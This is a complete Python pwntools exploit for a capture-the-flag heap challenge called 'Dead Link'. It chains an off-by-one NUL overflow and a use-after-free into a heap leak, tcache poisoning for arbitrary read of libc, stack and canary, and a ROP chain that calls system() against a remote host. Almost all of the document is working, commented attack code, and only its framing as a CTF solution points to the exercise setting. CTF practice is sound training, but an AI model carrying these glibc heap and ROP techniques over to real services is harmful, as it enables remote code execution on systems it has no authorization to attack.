#!/usr/bin/env python3
# Dead Link  (bcsctf)  --  exploit
#
# Bugs
#   1. read_with_null(): off-by-one NUL byte overflow. When read() returns
#      exactly `size` bytes and the last byte is not '\n', it writes buf[size]=0,
#      one byte past the data buffer -> poison-null / House of Einherjar.
#   2. delete(): the freed node pointer is kept in the global `bin[]` array and
#      `binview()` dereferences it -> UAF read of freed chunks (safe-linking
#      heap leak) and, once a bin[] entry is attacker-controlled, arbitrary read.
#
# Strategy
#   - gate: answer[i] = token[i] ^ 0xC3 ^ ((7*i) & 0xFF)
#   - leak heap key + first chunk via the recycle-bin UAF (safe-linking).
#   - off-by-one -> tcache poison -> allocate a fake node whose data overlaps the
#     bss `bin[]` array. Writing that node sets bin[0]=X, bin_cnt=1, so binview
#     leaks *(X) -> arbitrary read. Leak printf@GOT (libc), environ (stack), scan
#     for saved RIP, canary, saved RBP.
#   - second poison -> allocate a "node" over the saved-return-address region and
#     write a small ROP (ret; pop rdi; "cat flag.txt"; system).
#
# IMPORTANT FIX vs. the original attempt
#   The final write must target saved_rip - 0x38 (NOT -0x28).
#   add() does `node->next = 0; node->size = req` right after malloc. With a
#   target of saved_rip-0x28 the `node->next = 0` store lands on add()'s own
#   `size` local at [rbp-0x1c] == saved_rip-0x24 and zeroes it, so read() is
#   called with length 0, returns 0, and read_with_null() calls _exit(0)
#   (this is the EOF you saw). saved_rip-0x38 keeps the header stores below
#   add()'s locals, keeps the data write above read_with_null()'s own canary,
#   and still lets the data overwrite the canary/rbp/return slots correctly.
#
from pwn import *
import re, sys, os

exe  = ELF("./deadlink", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.binary = exe
context.log_level = os.environ.get("LL", "info")

HOST = os.environ.get("HOST", "172.16.38.22")
PORT = int(os.environ.get("PORT", "6656"))
OFF  = int(os.environ.get("OFF", "0x38"), 16)   # saved_rip-0x38 avoids clobbering add()'s size local; 0x28 zeroes it

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    # local run: prefer a faithful glibc-2.35 loader if present, else run the
    # binary directly with the local libc on LD_LIBRARY_PATH.
    if os.path.exists("./ld-2.35.so"):
        return process(["./ld-2.35.so", "--library-path", ".", "./deadlink"])
    return process("./deadlink", env={"LD_LIBRARY_PATH": "."})

io = None
menu_map = {}
pie = 0
B_REQ, B_CHUNK, D_REQ = 0x3e8, 0x400, 0x4b8

def recv_menu():
    global menu_map
    out = io.recvuntil(b"$ ", timeout=8)
    menu_map = {}
    for num, label in re.findall(r"(\d+)\) ([^\n\r]+)", out.decode("latin-1", "ignore")):
        menu_map[label.strip()] = num.encode()
    return out

def choose(label):
    io.sendline(menu_map[label])

def gate():
    global pie
    out = io.recvuntil(b"> ", timeout=8)
    leak  = int(re.search(rb"@ (0x[0-9a-fA-F]+)", out).group(1), 16)
    token = bytes.fromhex(re.search(rb"Token: ([0-9a-fA-F]{64})", out).group(1).decode())
    pie = leak - exe.sym["dead_filter"]          # printed "system()" is really dead_filter
    io.send(bytes([token[i] ^ 0xC3 ^ ((7 * i) & 0xFF) for i in range(32)]))
    recv_menu()
    log.success(f"PIE base = {hex(pie)}")

def add(size, data):
    choose("Add a node"); io.recvuntil(b"Size?"); io.sendline(str(size).encode())
    io.recvuntil(b"Data?"); io.send(data); return recv_menu()

def delete(idx):
    choose("Delete a node"); io.recvuntil(b"delete?"); io.sendline(str(idx).encode()); return recv_menu()

def change(idx, data):
    choose("Change a node"); io.recvuntil(b"change?"); io.sendline(str(idx).encode())
    io.recvuntil(b"Data?"); io.send(data); return recv_menu()

def viewbin():
    choose("View recycle bin"); return recv_menu()

def parse_bin(out, idx=0):
    m = re.search(rb"Bin\(%d\): next=([^ ]+) size=(\d+) data=" % idx, out)
    if not m:
        log.error("could not parse bin:\n" + out.decode("latin-1", "ignore"))
    nxt = 0 if m.group(1) == b"(nil)" else int(m.group(1), 16)
    return nxt, int(m.group(2))

def set_bin_ptr(addr):
    p = bytearray(b"\x00" * 0x84)
    p[0:8]     = p64(addr)      # bin[0]
    p[0x80:0x84] = p32(1)       # bin_cnt = 1
    change(3, bytes(p))         # index 3 == fake bss node

def leak_qword(addr):
    set_bin_ptr(addr)
    v, _ = parse_bin(viewbin(), 0)
    return v

def attempt():
    global io
    libc.address = 0          # reset per attempt: libc is reused, so un-rebase
    io = start()              # symbols before recomputing base (otherwise attempt
    gate()                    # 2+ subtract an already-rebased libc.sym -> garbage)

    # ---- 1. safe-linking heap leak via recycle-bin UAF ----
    add(0x20, b"A\n"); add(0x20, b"B\n")
    delete(0); heap_key, _ = parse_bin(viewbin(), 0)
    delete(0); enc, _      = parse_bin(viewbin(), 1)
    x_user = enc ^ heap_key
    log.success(f"heap key    = {hex(heap_key)}")
    log.success(f"first chunk = {hex(x_user)}")

    a_user  = x_user + 0x80
    a_hdr   = a_user - 0x10
    fake    = a_hdr + 0x30
    d_data  = a_hdr + 0x50
    c1_user = a_hdr + 0x100 + B_CHUNK + 0x10
    c1_off  = c1_user - d_data
    ch      = c1_off - 0x10
    bss_fake = pie + 0x5050

    # ---- 2. build layout & House of Einherjar (off-by-one NUL) ----
    add(0xe8, b"a\n")           # 0 A
    add(B_REQ, b"b\n")          # 1 B  (chunk 0x400)
    add(0xe8, b"c1\n")          # 2 C1
    add(0xe8, b"c2\n")          # 3 C2
    for _ in range(7): add(B_REQ, b"fill\n")
    for _ in range(7): delete(4)

    p = bytearray(b"A" * 0xe8)
    p[0x10:0x18] = p64(0);    p[0x18:0x20] = p64(0xd1)   # fake chunk header
    p[0x20:0x28] = p64(fake); p[0x28:0x30] = p64(fake)   # fake fd/bk
    p[0xe0:0xe8] = p64(0xd0)                             # B.prev_size
    change(0, bytes(p))         # exact 0xe8 -> NUL nulls B.size low byte 0x401->0x400
    delete(1)                   # backward consolidate
    add(D_REQ, b"d\n")          # D overlaps A
    p2 = bytearray(b"Z" * 0xe8); p2[0x20:0x28] = p64(0); p2[0x28:0x30] = p64(0x1200)
    change(0, bytes(p2))        # enlarge D->size via A
    delete(2); delete(1)        # free C2 then C1 -> tcache[0x100]

    # poison C1->fd toward the fake bss node
    fd = bss_fake ^ (c1_user >> 12)
    ov = bytearray(b"K" * (c1_off + 8))
    ov[ch:ch + 8]         = p64(0)
    ov[ch + 8:ch + 0x10]  = p64(0x101)
    ov[c1_off:c1_off + 8] = p64(fd)
    # trailing '\n': read_with_null then truncates the newline (buf[n-1]=0) instead
    # of writing a stray NUL over the byte after the poisoned fd (deterministic).
    change(1, bytes(ov) + b"\n")
    add(0xe8, b"take-c1\n")     # returns C1
    bp = bytearray(b"\x00" * 0x84); bp[0:8] = p64(pie + exe.got["printf"]); bp[0x80:0x84] = p32(1)
    add(0xe8, bytes(bp))        # index 3 == fake bss node

    # ---- 3. arbitrary read: libc, stack, canary, saved RIP ----
    printf_leak = leak_qword(pie + exe.got["printf"])
    libc.address = printf_leak - libc.sym["printf"]
    log.success(f"printf leak = {hex(printf_leak)}")
    log.success(f"libc base   = {hex(libc.address)}")
    env = leak_qword(libc.sym["environ"])
    log.success(f"environ     = {hex(env)}")

    target_ret = pie + 0x200b                  # return addr into main after `call binview`
    saved_rip = None
    for o in range(0x20, 0x3000, 8):
        if leak_qword(env - o) == target_ret:
            saved_rip = env - o; break
    if saved_rip is None:
        log.failure("saved RIP not found"); io.close(); return None
    canary    = leak_qword(saved_rip - 0x10)
    saved_rbp = leak_qword(saved_rip - 0x8)
    log.success(f"saved RIP = {hex(saved_rip)}")
    log.success(f"canary    = {hex(canary)}")
    log.success(f"saved RBP = {hex(saved_rbp)}")

    stack_target = saved_rip - OFF             # <-- 0x38, the fix
    log.info(f"stack target = {hex(stack_target)} (OFF={hex(OFF)})")

    # ---- 4. second poison: allocate over the return frame ----
    add(0xe8, b"q1\n")          # index 4
    delete(4); delete(2)        # free q1 then C1 -> tcache[0x100] head = C1
    fd2 = stack_target ^ (c1_user >> 12)
    ov2 = bytearray(b"L" * (c1_off + 8))
    ov2[ch:ch + 8]         = p64(0)
    ov2[ch + 8:ch + 0x10]  = p64(0x101)
    ov2[c1_off:c1_off + 8] = p64(fd2)
    # trailing '\n' keeps the poisoned fd2 intact regardless of its high byte
    change(1, bytes(ov2) + b"\n")
    add(0xe8, b"dummy\n")       # returns C1, tcache head = stack_target

    # ---- 5. ROP chain written by the final add() ----
    # The write lands in the cramped add()/read_with_null frame overlap, so exact
    # placement of the return slot is fragile. Use a long `ret`-slide: as long as
    # add()'s return (saved_rip) lands anywhere in the slide, execution slides
    # down to pop_rdi; system("cat flag.txt"). The canary must still be exact.
    rop     = ROP(libc)
    ret     = rop.find_gadget(["ret"])[0]
    pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
    system  = libc.sym["system"]

    SLIDE_START = OFF - 0x10      # data offset that maps to saved_rip
    data_addr   = stack_target + 0x10
    # Keep the chain SHORT and place its tail right after the return slot, so the
    # whole thing lands within the first ~0x50 bytes. The server reads the data
    # with a single read(); over TCP that read can return short and truncate a
    # tail placed late (that's why a 0xb8 tail gave "reached read but no flag").
    # system() is entered with rsp == saved_rip + TAIL, which must be 16-aligned
    # (else movaps in do_system segfaults). Pick the smallest aligned TAIL.
    TAIL = SLIDE_START + 0x10     # just past the return slot (leaves 2 ret slots)
    while (saved_rip + TAIL) % 16 != 0:
        TAIL += 8
    STR_OFF   = TAIL + 0x18
    cmd_addr  = data_addr + STR_OFF
    log.info(f"TAIL={hex(TAIL)} chain_end={hex(STR_OFF+0x14)} "
             f"sys_rsp&0xf={hex((saved_rip + TAIL) & 0xf)} (want 0)")

    data = bytearray()
    data += p64(ret) * (0xe8 // 8)          # baseline ret-slide everywhere
    data = data[:0xe8]
    def put(off, v): data[off:off + 8] = p64(v)
    put(OFF - 0x20, canary)                 # -> saved_rip-0x10 (add()'s canary, exact)
    put(OFF - 0x18, saved_rbp)              # -> saved_rip-0x08
    # SLIDE_START .. TAIL already full of `ret`
    put(TAIL,        pop_rdi)
    put(TAIL + 0x08, cmd_addr)
    put(TAIL + 0x10, system)
    # Self-diagnosing command: echo a marker (proves the ROP fired) then try
    # several flag locations. system() runs /bin/sh -c "<cmd>".
    cmd = b"echo ROP_OK;cat flag.txt /script/flag.txt 2>&1\x00"
    assert STR_OFF + len(cmd) <= 0xe8, "cmd too long"
    data[STR_OFF:STR_OFF + len(cmd)] = cmd

    log.success("sending final ROP chain")
    choose("Add a node"); io.recvuntil(b"Size?"); io.sendline(str(0xe8).encode())
    r = io.recvuntil(b"Data?", timeout=5)
    if b"Data?" not in r:
        # Died before the read -> this OFF isn't reaching the allocation on this
        # target's frame layout. Tells us to change OFF, not the chain.
        log.warning(f"died before 'Data?' (flaky poison) -> retry")
        io.close(); return None
    io.send(bytes(data))         # add() prints Success, then returns into the chain

    out = io.recvrepeat(3)
    m = re.search(rb"bcsctf\{[^}]*\}", out)
    if m:
        print(out.decode("latin-1", "ignore"))
        log.success("FLAG: " + m.group().decode())
        io.close(); return m.group().decode()
    if b"ROP_OK" in out:
        print(out.decode("latin-1", "ignore"))
        log.warning("ROP fired but no flag -> file/cwd/perms; raw: %r" % out)
        io.interactive(); return "ROP_OK"
    io.close(); return None

def attempt_before_data(r):
    return b"Data?" not in r

def main():
    # The second poison is a coin-flip; OFF=0x38 wins WHEN it lands. Retry, but
    # GENTLY: the service is behind xinetd with a connection-rate limit, so space
    # attempts far apart (a tight loop disables the service). Default 5 tries,
    # 25s apart -> ~1 connection / 30s, well under any cps limit.
    import time
    tries = int(os.environ.get("TRIES", "5"))
    gap   = float(os.environ.get("GAP", "25"))
    for i in range(tries):
        print(f"[*] === attempt {i+1}/{tries}  OFF={hex(OFF)} ===")
        res = None
        try:
            res = attempt()
        except Exception as e:
            log.warning(f"attempt error: {type(e).__name__}: {e}")
            try: io.close()
            except: pass
        if res:
            return
        if i != tries - 1:
            print(f"[*] waiting {gap:.0f}s before next attempt (xinetd cps cooldown)...")
            time.sleep(gap)
    log.failure("no landing yet — re-run later; the poison is ~50/50, it will hit. "
                "Tune with TRIES=/GAP=; if a run reaches 'Data?' but stays silent, tell me.")

if __name__ == "__main__":
    main()
